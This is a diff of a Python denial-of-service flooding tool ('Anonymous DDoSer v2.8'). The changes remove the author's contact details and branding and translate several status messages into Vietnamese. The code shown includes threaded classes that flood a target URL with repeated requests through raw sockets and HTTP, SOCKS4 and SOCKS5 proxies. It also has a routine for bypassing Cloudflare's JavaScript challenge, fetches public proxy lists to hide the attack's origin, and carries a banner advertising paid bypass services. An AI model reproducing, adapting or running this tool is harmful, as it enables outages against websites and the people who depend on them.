@@ -1,10 +1,10 @@
 
 #[+]==============[ Contact ]===========[+]#
-# # Discord: PassDDoS#6595               # #
-# # ICQ    : @passddos                   # #
-# # Tele   : https://t.me/PassDDoS       # #
-# # Email  : passddos@gmail.com          # #
-# # Github : https://github.com/PassDDoS # #
+# #                   Ddos               # #
+# #                                      # #
+# #                                      # #
+# #                                      # #
+# #                                      # #
 #[+]====================================[+]#
 
 import os, sys
@@ -184,17 +184,17 @@ def logo():
     elif sys.platform.startswith("freebsd"):
         os.system('clear')
     else:
-        os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title Download: bit.ly/AnonyV28 ~ Anonymous DDoSer v2.8")
+        os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title ddos")
     print('''
-             - PassDDoS#6595 Selling Bypass JS/UAM/Captcha/etc -
+             -     Selling Bypass JS/UAM/Captcha/etc -
 
-    /\_____/\     88""Yb    db    .dP"Y8 .dP"Y8 8888b.  8888b.   dP"Yb  .dP"Y8
-   /  o   o  \    88__dP   dPYb   `Ybo." `Ybo."  8I  Yb  8I  Yb dP   Yb `Ybo."
-  ( ==  ^  == )   88"""   dP__Yb  o.`Y8b o.`Y8b  8I  dY  8I  dY Yb   dP o.`Y8b
-   )         (    88     dP""""Yb 8bodP' 8bodP' 8888Y"  8888Y"   YbodP  8bodP'
-  (           )   ========================================================
- ( (  )   (  ) )     Anonymous DDoSer v2.8 - Best HTTP Flooder For FREE
-(__(__)___(__)__) ===== Version: [ Private ]''')
+    /\_____/\     
+   /  o   o  \    
+  ( ==  ^  == )   
+   )         (    
+  (           )   
+ ( (  )   (  ) )     
+(__(__)___(__)__)  ddos --------''')
     try:
         print("\n[*] Target : " +str(url_main)+ ":" +str(port))
     except:
@@ -272,10 +272,10 @@ def start_port():
     if port == '':
         if "https" in url:
                 port = int(443)
-                print("[!] Selected Port = 443 [!]")
+                print("[!] Cổng = 443 [!]")
         else:
             port = int(80)
-            print("[!] Selected Port = 80 [!]")
+            print("[!] Cổng = 80 [!]")
     else:
         port = int(port)
 
@@ -386,7 +386,7 @@ def pass_cf():
         print("[!] Bypassing Again... [" +str(error_cf)+ "]")
         if error_cf>5:
             os.system("cls")
-            print("[!] ERROR BYPASS\n[!] Please Select Another Attack Or Ignore Method[!]")
+            print("[!] Lỗi BYPASS\n[!] Vui lòng chọn một phương pháp tấn công hoặc bỏ qua khác [!]")
             start_mode()
         else:
             pass_cf()
@@ -415,14 +415,14 @@ def choice_down_proxies():
     choice4 = input("[?] Get New List " +str(filenam2)+ " [Y/N]: ")
     if (choice4 == "y") or (choice4 == "Y"):
         print("-----------------------------")
-        print("|_--> 1: Server X")
-        print("|_--> 2: Server Z")
+        print("|_--> 1: Server socks4")
+        print("|_--> 2: Server socks5")
         sel_pr = input("[?] Server Get [1/2]: ")
         if choice_mode == "proxy":
             if sel_pr == "1":
-                urlproxy = "https://www.proxy-list.download/api/v1/get?type=http"
+                urlproxy = "https://www.proxy-list.download/api/v1/get?type=socks4"
             else:
-                urlproxy = "https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=5000&country=all&ssl=yes&anonymity=all"
+                urlproxy = "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&timeout=5000&country=all&ssl=yes&anonymity=all"
         else:
             if sel_pr == "1":
                 urlproxy = "https://www.proxy-list.download/api/v1/get?type=socks5"
@@ -445,7 +445,7 @@ def numthreads():
     begin()
 
 def begin():
-    choice6 = input('=*= Press "Enter" to start attack: ')
+    choice6 = input('=*= Nhấn "Enter" để bắt đầu tấn công: ')
     if choice6 == "":
         #webbrowser.open("https://youtu.be/9WV1EALFiN0", new=0, autoraise=True)
         if ("edu" in url) or ("vn" in url) or ("hentai" in url) or ("porn" in url):
@@ -515,7 +515,7 @@ class raw_dos(threading.Thread):
                     requests.get(url, headers=headersx)
                 else:
                     requests.get(url+ "/?=" +str(random.randint(0,20000)), headers=headersx)
-                print("[+] bit.ly/AnonyV28 | Raw-DoS @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
+                print("[+] Tấn công | Raw-DoS @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                 while True:
                     try:
                         for _ in range(100):
@@ -577,7 +577,7 @@ class Proxy(threading.Thread):
                 #req_code += 1
                 #sys.stdout.write("[!] bit.ly/AnonyV28 | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                 #sys.stdout.flush()
-                print("[!] bit.ly/AnonyV28 | Proxy @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
+                print("[!] Tấn công | Proxy @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                 try:
                     for y in range(multiple):
                         s.send(str.encode(request))
@@ -647,7 +647,7 @@ class Socks(threading.Thread):
                 s.send(str.encode(request))
                 s.send(str.encode(request))
                 s.send(str.encode(request))
-                print("[!] bit.ly/AnonyV28 | Socks5 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
+                print("[!] Tấn công | Socks5 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                 try:
                     for y in range(multiple):
                         s.send(str.encode(request))
@@ -677,7 +677,7 @@ class Socks(threading.Thread):
                     if str(port) == '443':
                         s = ssl.wrap_socket(s)
                     s.send(str.encode(request))
-                    print("[!] bit.ly/AnonyV28 | Socks4 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
+                    print("[!] Tấn công | Socks4 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                     try:
                         for y in range(multiple):
                             s.send(str.encode(request))
@@ -725,9 +725,9 @@ class Home(threading.Thread):
                 s.send(str.encode(request))
                 s.send(str.encode(request))
                 s.send(str.encode(request))
-                print("[+] bit.ly/AnonyV28 | Home @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
+                print("[+] Tấn công | Home @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                 #req_code += 1
-                #sys.stdout.write("[!] bit.ly/AnonyV28 | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
+                #sys.stdout.write("[!] Tấn công | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                 #sys.stdout.flush()
                 try:
                     for y in range(multiple):
@@ -779,7 +779,7 @@ class JSv1(threading.Thread):
                     http.request("GET", url, headers=headersx)
                 else:
                     http.request("GET /?=" +str(random.randint(0,20000)), headers=headersx)
-                print("[+] bit.ly/AnonyV28 | JS-Normal @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
+                print("[+] Tấn công | JS-Normal @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
                 try:
                     for y in range(multiple):
                         http.request("GET", url,headers=headersx)
@@ -811,7 +811,7 @@ class JSv2(threading.Thread):
                     soso = scraper.get(url, timeout=15)
                 else:
                     soso = scraper.get(url+ "?=" +str(random.randint(0,20000)), timeout=15)
-                print("[+] bit.ly/AnonyV28 | JS-Normal @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
+                print("[+] Tấn công | JS-Normal @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
                 #req_code += 1
                 try:
                     for y in range(multiple):
